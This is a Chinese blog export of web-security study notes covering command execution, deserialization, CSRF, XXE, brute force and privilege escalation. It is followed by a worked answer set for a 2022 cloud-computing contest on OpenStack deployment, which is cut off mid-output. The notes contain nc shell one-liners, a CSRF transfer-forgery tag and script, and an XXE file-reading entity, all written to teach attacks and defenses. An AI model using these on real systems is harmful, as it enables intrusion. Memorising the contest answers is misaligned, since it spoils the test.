在服务器日志中可看到：xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] &quot;GET /root HTTP/1.1&quot; 404 146 &quot;-&quot; &quot;curl/7.58.0&quot;，这样，命令的回显就能在日志中看到了
读文件命令ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd

反弹shellnc -L -p 9090-e cmd.exe (Windows)nc -l -p 9090-e /bin/bash (*nix)



防范措施1、各种框架、插件等位置都有可能出现命令执行，升级到新版本，多打补丁
2、关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响
3、少用框架&#x2F;CMS
4、可以过滤一些符号从而减少一些危险
5、安全配置好php相关参数      
​	通过Php配置文件里面有个disable_functions &#x3D; 配置，这个禁止某些php函数， 服务器便是用这个来禁止php的执行命令函数。
6、升级中间件
7、严格控制传入变量，严禁使用魔法函数
反序列化漏洞基础知识序列化：把对象转换成字节序列的过程，即把对象转换为可以存储或传输的数据过程。
反序列化：八字节序列恢复成对象的过程，即把可以存储或传输的数据转化为对象的过程。
漏洞产生的原因
在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的
产生原理
serialize() 和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。 当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。	
防范措施
更新和修补： 更新应用程序和库到最新版本，修补已知的漏洞。
代码审计： 对代码进行安全审计，查找和修复潜在的反序列化问题。
使用安全配置： 使用安全配置选项来限制反序列化操作。

CSRF客户端伪造请求漏洞介绍CSRF：客户端请求伪造，是一种对恶意脚本的一种利用方式。
简单来说：就是受害者在登录状态下，且服务端没有进行token和refer校验，攻击者利用CSRF漏洞构造恶意的连接诱导客户者点击，以受害者信息执行特定的操作。
漏洞原理
攻击的本质

在CSRF攻击中，攻击者诱使用户的浏览器发起一个恶意请求，本质上是借助用户的凭证，以用户的身份去执行特定的操作。
在用户访问攻击者构造的恶意页面时，如果此时浏览器访问第三方站点带上了第三方的Cookie，那么第三方站点会认为这是一个已登录的用户的访问请求，浏览器就可顺利完成请求操作，因此该攻击方式叫做“跨站请求伪造”。
在整个攻击过程中，攻击者并没有拿到受害者的身份凭证，也拿不到操作后的返回结果(同源策略)，攻击者只是诱使受害者发出了一个特定的请求。

漏洞分类GET类型GET类型的漏洞类似于XSS漏洞（只不过需要受害者在登陆状态）
仅需要构造HTTP请求，诱导用户在登陆状态下点击，即可构造CSRF攻击
简单示例：
银行站点A：它以GET请求来完毕银行转账的操作，如：

http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 

攻击者构造：

&lt;img src&#x3D;http://www.mybank.com/Transfer.php?toBankId=113&amp;money=1000&gt;

首先。你登录了银行站点A，然后访问危险站点B，这时你会发现你的银行账户少了1000块。
POST类型这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是&lt;image&gt;、&lt;iframe&gt;、&lt;script&gt;等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。
而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是$_REQUEST，而非$_POST获取变量，则会存在这个问题。
例如：







攻击者可以尝试构造一个GET请求

http: &#x2F;&#x2F;host&#x2F;register?username&#x3D;test&amp;password&#x3D;passwd

若无法构造成功，可以通过Burp构造post类型的CSRF攻击：




var f = document.getElementById ( "register");
f.inputs [0].value = "test";
f.inputs [1].value = "passwd" ;
f.submit ();


漏洞挖掘1、最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞。
2、如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。
3、随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下:
使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。
如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。
漏洞防御验证码CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。
在请求地址中添加 token 并验证可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
验证 HTTP Referer 字段Referer字段用来记录该HTTP请求的来源地址。

验证referer通过———&gt;合法请求
验证referer不通过———&gt;不合法请求

XXE漏洞XXE介绍XML被称为可扩展标记语⾔，与HTML类似，但是HTML中的标签都是预定义(预先定义好每个标签的作⽤)的，⽽XML语⾔中的标签都是⾃定义(可以⾃⼰定义标签的名称、属性、值、作⽤)的；HTML中的标签可以是单标
签，⽽XML中的标签必须是成对出现。
​	HTML语⾔主要⽤来展示内容，⽽XML语⾔⽤来传输数据。
XML语法语法规则
XML语⾔严格区分⼤⼩写，⽽HTML语⾔不区分⼤⼩写;XML语⾔只能有⼀个根标签;HTML语⾔中的属性值可以不⽤引号引起来，但是XML语⾔中的属性值必须⽤引号引起来；XML中的标签必须成对出现; HTML： &lt;img 属性=&quot;属性的值&quot;&gt; XML： &lt;security&gt;&lt;/security&gt;XML会对特殊字符进⾏实体转义，需要转义的字符如下：标签之间不能交叉编写;



文档结构
​	XML文档有xml声明、DTD文档类型、文档元素三部分组成。
XML文档声明&lt;?xml version=&quot;1.0&quot; ecoding=&quot;utf-8&quot; ?&gt; &lt;!-- 声明部分可有可无，但是建议写上--&gt;

DTD文档类型DTD文档中的关键字DOCTYPE（DTD的声明）ENTITY（实体的声明）ELEMENT（定义元素）SYSTEM、PUBLIC（外部资源申请）



XML文档元素
&lt;?xml version=&quot;1.0&quot; encoding=&quot;urf-8&quot; ?&gt;&lt;!DOCTYPE security [	&lt;?ELEMENT security (network,OS,websec,LAN)&gt;]&gt;&lt;security&gt;	&lt;network&gt;1&lt;/network&gt;	&lt;OS&gt;1&lt;/OS&gt;	&lt;websec&gt;web&lt;/websec&gt;    &lt;LAN&gt;lan&lt;/LAN&gt;&lt;/security&gt;





DTD声明类型内部声明语法格式
&lt;?DOCTYPE 根元素 [元素声明]&gt;

案例如下
&lt;!DOCTYPE security [	&lt;!ELEMENT security (network,OS,websec,LAN)&gt;]&gt;



外部声明语法格式
&lt;!DOCTYPE 根元素 SYSTEM &quot;外部⽂件名&quot;&gt;

案例如下
&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;]&gt;



实体声明参数实体⽤“% 实体名称”声明，引⽤时也⽤“% 实体名称”；其余实体直接⽤实体名称声明，引⽤时⽤“&amp;实体名称;”。参数实体只能在DTD中声明，DTD中引⽤；其余实体只能在DTD中声明，可以在XML⽂档中引⽤。所谓的实体就是预先定义好的数据或者数据的集合。
内部实体：&lt;!ENTITY 实体名称 “实体的值”&gt;外部实体：&lt;!ENTITY 实体名称 SYSTEM “URL”&gt;参数实体：&lt;!ENTITY \% 实体名称 “实体的值”&gt;或者&lt;!ENTITY \% 实体名称 SYSTEM “URL” &gt;



漏洞基础1、漏洞形成原因
XXE被称为外部实体注⼊漏洞。XXE漏洞的形成主要是程序在解析XML⽂档输⼊时，没有禁⽌外部实体的加载，导致可加载外部的恶意⽂件，造成⽂件读取、命令执⾏、内⽹端⼝扫描、攻击内⽹⽹站。
2、支持的伪协议

file:⽤来加载本地⽂件http:⽤来加载远程⽂件ftp:⽤来访问ftp服务器上的⽂件php:⽤来读取php源码,php://filter



漏洞危害
探测内网端口
攻击内网网站
任意读取本地文件&#x2F;远程读取文件
读取PHP源码

防御方法1、经用是外部实体
PHP：libxml_disable_entity_loader(true);java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);python:rom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

2、过滤
预定义字符转义：&lt; &amp;lt; &gt; &amp;gt; &amp; &amp;amp; ‘ &amp;apos; “ &amp;quot;过滤⽤户提交的XML数据，关键词：SYSTEM和PUBLIC禁⽤外部实体：libxml_disable_entity_loader(true);











暴力破解漏洞介绍暴力破解：实际上就是使用枚举方法，将密码逐个进行猜解，获取真正密码。
C&#x2F;S架构破解 C&#x2F;S即客户端&#x2F;服务器,基于C&#x2F;S架构的应用程序 如 ssh ftp sql-server mysql 等，这些服务往往提供一个高权限的用户，而这个高权限的用户往往可以进行执行命令的操作，如 sql-server 的 sa ，mysql的root，oracle的sys和system帐号，使用这些高权限的用户能在很大程度上给开发人员带来方便，但如果口令被破解带来的危害也是相当大的。
C&#x2F;S架构主要使用的破解工具 Hydra、Bruter、X-scan
B&#x2F;S架构破解一般是对web应用程序中的高权限用户进行猜解，如网站的内容管理系统账户。一般针对 B&#x2F;S的暴力猜解，使用Burp Suit 镜像表单爆破。
API接口暴力猜解参考   https://xz.aliyun.com/t/6330
破解方法

基于表单的暴力破解
直接使用暴力破解工具即可

基于验证码的暴力破解

on client常见问题
在前端进行验证码验证；不安全的将验证码泄露在cookie中；不安全的将验证码在前端源代码中泄露


on server常见问题
验证码在后台不过期，导致长时间使用（php默认session时间为24分钟）；验证码校验不严格，逻辑出现问题；验证码过于简单


弱特证码识别攻击


基于token破解
由于token值输出在前端源代码中，容易被获取，因此也就失去了防暴力破解的意义，一般Token在防止CSRF上会有比较好的功效。


漏洞发现查找漏洞前注意事项

首先需要一个有效的字典（如top10常用密码字典）
判断暴力破解的页面的密码复杂度
网站是否存在验证码
是否对登录行为有限制
是否有token，双因素等验证信息

登录页面可能产生的漏洞




防范方法
强制要求输入验证码，否则，必须实施IP策略。 注意不要被X-Forwaded-For绕过了！
验证码只能用一次，用完立即过期！不能再次使用
验证码不要太弱。扭曲、变形、干扰线条、干扰背景色、变换字体等。
大网站最好统一安全验证码，各处使用同一个验证码接口。

越权与逻辑漏洞越权越权基础如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称为越权操作
形成原因：后台使用了不合理的权限校验规则导致的（没有验证session会话信息&#x2F;验证权限）。
权限分类
平行越权:
​	A用户和B用户属于同一级别的用户，但各自不能操作对方的个人信息，A用户如果可以操作B用户的个人信息的情况称为水平越权。
​	简而言之：可以对相同权限的用户进行操作。
​	防御方法：可以使用session会话来进行校验是否为同一用户操作。
垂直越权：
​	A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。
​	简而言之：对比自己权限高的用户进行操作。
​	防御方法：对用户权限和身份信息进行校验。
越权发现一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。
逻辑漏洞漏洞发现支付逻辑漏洞思路小集合

确定业务流程—&gt;寻找流程中可以被操控的环节—&gt;分析可被操控环节中可能产生的逻辑问题—&gt;尝试修改参数触发逻辑问题
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算职业技能大赛国赛题</title>
    <url>/posts/6bf8b7d7.html</url>
    <content><![CDATA[第一套【任务 1】私有云服务搭建[10分]【题目 1】基础环境配置[0.5 分]使用提供的用户名密码，登录提供的 OpenStack 私有云平台，在当前租户下，使用CentOS7.9 镜像，创建两台云主机，云主机类型使用 4vCPU&#x2F;12G&#x2F;100G_50G 类型。当前租户下默认存在一张网卡，自行创建第二张网卡并连接至 controller 和 compute 节点（第二张网卡的网段为 10.10.X.0&#x2F;24，X 为工位号，不需要创建路由）。自行检查安全组策略，以确保网络正常通信与 ssh 连接，然后按以下要求配置服务器：
（1）设置控制节点主机名为 controller，设置计算节点主机名为 compute； 
（2）修改 hosts 文件将 IP 地址映射为主机名；
1.查看控制节点名字为 controller 正确计 0.2 分2.查看 hosts 文件中有正确的主机名和 IP 映射计 0.2 分3.控制节点正确使用两块网卡计 0.1 分

[root@controller ~]# hostnamecontroller[root@controller ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute[root@controller ~]# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host       valid_lft forever preferred_lft forever2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:3d:4b:e6 brd ff:ff:ff:ff:ff:ff    inet 192.168.100.10/24 brd 192.168.100.255 scope global noprefixroute ens33       valid_lft forever preferred_lft forever    inet6 fe80::ee56:e4e:d291:8f31/64 scope link noprefixroute       valid_lft forever preferred_lft forever3: ens34: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:3d:4b:f0 brd ff:ff:ff:ff:ff:ff    inet 192.168.200.10/24 brd 192.168.200.255 scope global noprefixroute ens34       valid_lft forever preferred_lft forever    inet6 fe80::fe7c:1bec:9978:2d47/64 scope link noprefixroute       valid_lft forever preferred_lft forever

【题目 2】Yum 源配置[0.5 分]使用提供的 http 服务地址，在 http 服务下，存在 centos7.9 和 iaas 的网络 yum 源，使用该 http 源作为安装 iaas 平台的网络源。分别设置 controller 节点和 compute 节点的 yum 源文件 http.repo。完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.查看/etc/yum.repos.d/http.repo 文件，有正确的 baseurl 路径，计 0.5 分

#直接删除默认源rm -rf /etc/yum.repos.d/*#创建http类型的yum源cat &gt; /etc/yum.repos.d/http.repo &lt;&lt;EOF[centos]name=centosbaseurl=http://192.168.100.100/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=http://192.168.100.100/iaas/iaas-repogpgcheck=0enabled=1EOF#可以通过来验证源的配置是否正确yum makecache

【题目 3】配置无秘钥 ssh[0.5 分]配置 controller 节点可以无秘钥访问 compute 节点，配置完成后，尝试 ssh 连接 compute节点的 hostname 进行测试。完成后提交 controller 节点的用户名、密码和 IP 地址到答题框。
1.查看控制节点允许计算节点无秘钥登录计 0.5 分

[root@controller ~]# ssh root@computeThe authenticity of host &#x27;compute (192.168.100.20)&#x27; can&#x27;t be established.ECDSA key fingerprint is SHA256:w8T7ol8B+536sySmpugXGrPle6li9IMnc+ijwbcgjLc.ECDSA key fingerprint is MD5:31:1d:72:34:56:3d:fa:0c:71:30:cf:f4:77:66:b0:b6.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &#x27;compute&#x27; (ECDSA) to the list of known hosts.Last login: Wed Oct 12 15:13:34 2022[root@compute ~]# hostnamecompute

过程：
#创建密钥（回车即可）ssh-keygen#上传密钥ssh-copy-id root@192.168.100.20#验证ssh root@computehostname

【题目 4】基础安装[0.5 分]在控制节点和计算节点上分别安装 openstack-iaas 软件包，根据表 2 配置两个节点脚本文件中的基本变量（配置脚本文件为&#x2F;etc&#x2F;openstack&#x2F;openrc.sh）。

1.检查环境变量文件配置正确计 0.5 分

###0.提前准备#分区#在 compute 节点上利用空白分区划分 2个 20G 分区作为cinder与swift的存储#划分1个5G的硬盘做为manila1的存储，见题目11#划分1个5G的硬盘做为cinder扩展磁盘，见题目12#安装openstack-iaasyum install -y openstack-iaas###2.编辑环境变量，简化脚本#使用vi底行模式，正则表达式如下:%s@##.*@@g	#删除文件中开头##的所在行:%s@#@@g		#删除文件中开头的#:g@^$@d		#删除文件中所有的空行:%s/PASS=/PASS=000000/g  #快速配置文件中个服务组件的password#环境变量文件示例HOST_IP=192.168.100.10		#controller ip address，按照实际环境来HOST_PASS=000000HOST_NAME=controllerHOST_IP_NODE=192.168.100.20		#compute ip address，按照实际环境来HOST_PASS_NODE=000000HOST_NAME_NODE=computenetwork_segment_IP=192.168.100.0/24		RABBIT_USER=openstackRABBIT_PASS=000000DB_PASS=000000DOMAIN_NAME=demoADMIN_PASS=000000DEMO_PASS=000000KEYSTONE_DBPASS=000000GLANCE_DBPASS=000000GLANCE_PASS=000000PLACEMENT_DBPASS=000000PLACEMENT_PASS=000000NOVA_DBPASS=000000NOVA_PASS=000000NEUTRON_DBPASS=000000NEUTRON_PASS=000000METADATA_SECRET=000000INTERFACE_NAME=ens34Physical_NAME=providerminvlan=1maxvlan=200CINDER_DBPASS=000000CINDER_PASS=000000BLOCK_DISK=sdb1SWIFT_PASS=000000OBJECT_DISK=sdb2STORAGE_LOCAL_NET_IP=192.168.100.20 	#compute IPTROVE_DBPASS=000000TROVE_PASS=000000HEAT_DBPASS=000000HEAT_PASS=000000CEILOMETER_DBPASS=000000CEILOMETER_PASS=000000AODH_DBPASS=000000AODH_PASS=000000ZUN_DBPASS=000000ZUN_PASS=000000KURYR_PASS=000000OCTAVIA_DBPASS=000000OCTAVIA_PASS=000000MANILA_DBPASS=000000MANILA_PASS=000000SHARE_DISK=sdb3				    #manila—DiskCLOUDKITTY_DBPASS=000000CLOUDKITTY_PASS=000000BARBICAN_DBPASS=000000BARBICAN_PASS=000000###首先执行初始化包###(all node)iaas-pre-host.sh###3.controller node执行iaas-install-mysql.sh &amp;&amp; iaas-install-keystone.sh &amp;&amp; iaas-install-glance.sh \&amp;&amp; iaas-install-placement.sh &amp;&amp; iaas-install-nova-controller.sh \&amp;&amp; iaas-install-neutron-controller.sh &amp;&amp; iaas-install-dashboard.sh \&amp;&amp; iaas-install-cinder-controller.sh &amp;&amp; iaas-install-swift-controller.sh  \&amp;&amp; iaas-install-heat.sh &amp;&amp; iaas-install-manila-controller.sh \&amp;&amp; iaas-install-cloudkitty.sh &amp;&amp; iaas-install-barbican.sh###4.compute node 执行#提示：当控制节点在部署脚本的时候，计算节点也别闲着，可以为其安装相应的包cat /usr/local/bin/iaas-*compute.sh | grep yum #然后将如上罗列出来的内容全部安装后，等待controller节点的脚本执行后，执行如下内容iaas-install-nova-compute.sh  &amp;&amp; iaas-install-neutron-compute.sh \&amp;&amp; iaas-install-cinder-compute.sh &amp;&amp; iaas-install-swift-compute.sh \&amp;&amp; iaas-install-manila-compute.sh 

【题目 5】数据库安装与调优[0.5 分]在 controller 节点上使用 iaas-install-mysql.sh 脚本安装 Mariadb、Memcached、RabbitMQ
等服务。安装服务完毕后，修改&#x2F;etc&#x2F;my.cnf 文件，完成下列要求：
1.设置数据库支持大小写；
2.设置数据库缓存 innodb 表的索引，数据，插入数据时的缓冲为 4G；
3.设置数据库的 log buffer 为 64MB；
4.设置数据库的 redo log 大小为 256MB；
1.检查数据库配置正确计 0.5 分

[root@controller ~]# mysql -uroot -p000000 -e &quot; show variables like &#x27;innodb_log%&#x27;;&quot;+-----------------------------+-----------+| Variable_name               | Value     |+-----------------------------+-----------+| innodb_log_buffer_size      | 67108864  || innodb_log_checksums        | ON        || innodb_log_compressed_pages | ON        || innodb_log_file_size        | 268435456 || innodb_log_files_in_group   | 2         || innodb_log_group_home_dir   | ./        || innodb_log_optimize_ddl     | ON        || innodb_log_write_ahead_size | 8192      |+-----------------------------+-----------+



vi /etc/my.cnf#大小写敏感lower_case_table_names = 1#缓存区innodb_buffer_pool_size = 4G#设置数据库的 log bufferinnodb_log_buffer_size = 64M#InnoDB redo log大小innodb_log_file_size = 256M#设置数据库的 redo log 文件组为 2innodb_log_files_in_group = 2#重启服务systemctl restart mariadb

【题目 6】Keystone 服务安装与使用[0.5 分]在 controller 节点上使用 iaas-install-keystone.sh 脚本安装 Keystone 服务。安装完成后，使用相关命令，创建用户 chinaskill，密码为 000000。完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 keystone 服务安装正确计 0.2 分2.检查 chinaskill 用户创建正确计 0.3 分

[root@controller ~]# openstack user show chinaskill+---------------------+----------------------------------+| Field               | Value                            |+---------------------+----------------------------------+| domain_id           | default                          || enabled             | True                             || id                  | f79373ccd5d34b34a023f18c5f181826 || name                | chinaskill                       || options             | &#123;&#125;                               || password_expires_at | None                             |+---------------------+----------------------------------+

过程
source /etc/keystone/admin-openrc.sh#创建用户openstack user create chinaskill --password 000000#查看是否创建成功openstack user show chinaskill

【题目 7】Glance 安装与使用[0.5 分]在 controller 节点上使用 iaas-install-glance.sh 脚本安装 glance 服务。使用命令将提供的 cirros-0.3.4-x86_64-disk.img 镜像（该镜像在 HTTP 服务中，可自行下载）上传至平台，命名为 cirros，并设置最小启动需要的硬盘为 10G，最小启动需要的内存为 1G。完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 glance 服务安装正确计 0.1 分2.检查 cirros 镜像最小启动硬盘与内存配置正确计 0.4 分

[root@controller ~]# openstack image show cirros+------------------+------------------------------------------------------------------------                                                                                             --------------------------------------------------------------------------------------------                                                                                             ------------------------+| Field            | Value                                                                                                                                                                                                                                                                                                                                                                                |+------------------+------------------------------------------------------------------------                                                                                             --------------------------------------------------------------------------------------------                                                                                             ------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                                                                                                                                                                                                                     || container_format | bare                                                                                                                                                                                                                                                                                                                                                                                 || created_at       | 2022-10-12T08:42:35Z                                                                                                                                                                                                                                                                                                                                                                 || disk_format      | qcow2                                                                                                                                                                                                                                                                                                                                                                                || file             | /v2/images/b757b50b-fd2c-4a42-9bff-31dcf0585917/file                                                                                                                                                                                                                                                                                                                                 || id               | b757b50b-fd2c-4a42-9bff-31dcf0585917                                                                                                                                                                                                                                                                                                                                                 || min_disk         | 10                                                                                                                                                                                                                                                                                                                                                                                   || min_ram          | 1024                                                                                                                                                                                                                                                                                                                                                                                 || name             | cirros                                                                                                                                                                                                                                                                                                                                                                               || owner            | ef3705db528144cc9a33f8ace06d6d3b                                                                                                                                                                                                                                                                                                                                                     || properties       | os_hash_algo=&#x27;sha512&#x27;, os_hash_value=&#x27;1b03ca1bc3fafe448b90583c12f367949                                                                                             f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bb                                                                                             db2&#x27;, os_hidden=&#x27;False&#x27; || protected        | False                                                                                                                                                                                                                                                                                                                                                                                || schema           | /v2/schemas/image                                                                                                                                                                                                                                                                                                                                                                    || size             | 13287936                                                                                                                                                                                                                                                                                                                                                                             || status           | active                                                                                                                                                                                                                                                                                                                                                                               || tags             |                                                                                                                                                                                                                                                                                                                                                                                      || updated_at       | 2022-10-12T08:43:47Z                                                                                                                                                                                                                                                                                                                                                                 || virtual_size     | None                                                                                                                                                                                                                                                                                                                                                                                 || visibility       | shared                                                                                                                                                                                                                                                                                                                                                                               |+------------------+------------------------------------------------------------------------                                                                                             --------------------------------------------------------------------------------------------                                                                                             ------------------------+

过程：
#创建镜像openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img#设置镜像最小启动需要的硬盘为 10G，最小启动需要的内存为 1Gopenstack image set cirros --min-disk 10 --min-ram 1024

【题目 8】Nova 安装与优化[0.5 分]在 controller 节点和 compute 节点上分别使用 iaas-install-placement.sh 脚本、iaas-install-nova -controller.sh 脚本、iaas-install-nova-compute.sh 脚本安装 Nova 服务。安装完成后，请修改 nova 相关配置文件，解决因等待时间过长而导致虚拟机启动超时从而获取不到 IP 地址而报错失败的问题。配置完成后提交 controller 点的用户名、密码和 IP 地址到答题框。
1.检查 nova 服务解决超时问题配置正确计 0.5 分

cat /etc/nova/nova.conf |grep vif_plugging_is_fatalvif_plugging_is_fatal=false

过程：
vi /etc/nova/nova.conf vif_plugging_is_fatal=false#重启nova服务systemctl restart openstack-nova*

【题目 9】Neutron 安装[0.5 分]使用提供的脚本 iaas-install-neutron-controller.sh 和 iaas-install-neutron-compute.sh，在controller 和 compute 节点上安装neutron 服务。完成后提交控制节点的用户名、密码和 IP地址到答题框。
1.检查 neutron 服务安装正确计 0.2 分2.检查 neutron 服务的 linuxbridge 网桥服务启动正确计 0.3 分

[root@controller ~]# openstack-service status | grep linuxbridgeMainPID=17877 Id=neutron-linuxbridge-agent.service ActiveState=active

【题目 10】Doshboard 安装[0.5 分]在controller节点上使用iaas-install-dashboad.sh脚本安装dashboad服务。安装完成后，将 Dashboard 中的 Djingo 数据修改为存储在文件中（此种修改解决了 ALL-in-one 快照在其他云平台 Dashboard 不能访问的问题）。完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 Dashboard 服务安装正确计 0.2 分2.检查 Dashboard 服务中 Djingo 数据修改为存储在文件中配置正确计 0.3 分

cat /etc/openstack-dashboard/local_settings |grep djangoSESSION_ENGINE = &#x27;django.contrib.sessions.backends.file&#x27;

过程：
vi /etc/openstack-dashboard/local_settingsSESSION_ENGINE = &#x27;django.contrib.sessions.backends.file&#x27;#重启服务生效配置systemctl restart httpd

【题目 11】Swift 安装[0.5 分]在 控 制 节 点 和 计 算 节 点 上 分 别 使 用 iaas-install-swift-controller.sh 和iaas-install-swift-compute.sh 脚本安装 Swift 服务。安装完成后，使用命令创建一个名叫examcontainer 的容器，将 cirros-0.3.4-x86_64-disk.img 镜像上传到 examcontainer 容器中，并设置分段存放，每一段大小为 10M。完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 swift 服务安装正确计 0.3 分2.分段上传 cirros 镜像正确计 0.2 分

[root@controller ~]# swift stat examcontainer  cirros-0.3.4-x86_64-disk.img               Account: AUTH_ef3705db528144cc9a33f8ace06d6d3b             Container: examcontainer                Object: cirros-0.3.4-x86_64-disk.img          Content Type: application/octet-stream        Content Length: 13287936         Last Modified: Wed, 12 Oct 2022 09:32:27 GMT                  ETag: &quot;5cde37512919eda28a822e472bb0a2dd&quot;              Manifest: examcontainer_segments/cirros-0.3.4-x86_64-disk.img/1665563891.781025/13287936/10485760/            Meta Mtime: 1665563891.781025         Accept-Ranges: bytes           X-Timestamp: 1665567146.81794            X-Trans-Id: tx47b60b986ef545d19e59d-00634689e7X-Openstack-Request-Id: tx47b60b986ef545d19e59d-00634689e7

过程
#创建examcontainer容器swift post examcontainer#将镜像分段上传swift  upload examcontainer -S 10485760 cirros-0.3.4-x86_64-disk.img#查看是否成功上传 swift stat examcontainer  cirros-0.3.4-x86_64-disk.img

【题目 12】Cinder 创建硬盘[0.5 分]在 控 制 节 点 和 计 算 节 点 分 别 使 用 
iaas-install-cinder-controller.sh 、iaas-install-cinder-compute.sh 脚本安装 Cinder 服务，请在计算节点，对块存储进行扩容操作，即在计算节点再分出一个 5G 的分区，加入到 cinder 块存储的后端存储中去。完成后提交计算节点的用户名、密码和 IP 地址到答题框。
1.检查 cinder 后端存储扩容成功计 0.5 分

vgdisplay--- Volume group ---  VG Name               cinder-volumes  System ID  Format                lvm2  Metadata Areas        2  Metadata Sequence No  5  VG Access             read/write  VG Status             resizable  MAX LV                0  Cur LV                1  Open LV               0  Max PV                0  Cur PV                2  Act PV                2  VG Size               49.99 GiB  PE Size               4.00 MiB  Total PE              12798  Alloc PE / Size       9748 / &lt;38.08 GiB  Free  PE / Size       3050 / 11.91 GiB  VG UUID               DgfDCG-y8uU-Slr0-V9J5-jw1H-nrsT-SokTeh

过程：
#创建物理卷pvcreate /dev/sdc2#扩展vgextend cinder-volumes /dev/sdc2



【题目 13】Manila 服务安装与使用[0.5 分]在 控 制 和 计 算 节 点 上 分 别 使 用 
iaas-install-manila-controller.sh 和iaas-install-manila-compute.sh 脚本安装 manila 服务。安装服务后创建 default_share_type 共享类型（不使用驱动程序支持），接着创建一个大小为 2G 的共享存储名为 share01 并开放share01 目录对 OpenStack 管理网段使用权限。最后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 share01 共享存储正确创建并赋予权限计 0.5 分

[root@controller ~]# manila type-list+--------------------------------------+--------------------+------------+-----------                                                                                                    -+--------------------------------------+----------------------+-------------+| ID                                   | Name               | visibility | is_default                                                                                                     | required_extra_specs                 | optional_extra_specs | Description |+--------------------------------------+--------------------+------------+-----------                                                                                                    -+--------------------------------------+----------------------+-------------+| 11caa227-7ae2-40cf-bdd1-54ca6712dc5e | default_share_type | public     | YES                                                                                                            | driver_handles_share_servers : False |                      | None        |+--------------------------------------+--------------------+------------+-----------                                                                                                    -+--------------------------------------+----------------------+-------------+[root@controller ~]# manila list+--------------------------------------+---------+------+-------------+-----------+--                                                                                                    ---------+--------------------+-----------------------------+-------------------+| ID                                   | Name    | Size | Share Proto | Status    | I                                                                                                    s Public | Share Type Name    | Host                        | Availability Zone |+--------------------------------------+---------+------+-------------+-----------+--                                                                                                    ---------+--------------------+-----------------------------+-------------------+| b8e66c11-64e3-48f3-aed0-ca474aa57537 | share01 | 2    | NFS         | available | F                                                                                                    alse     | default_share_type | 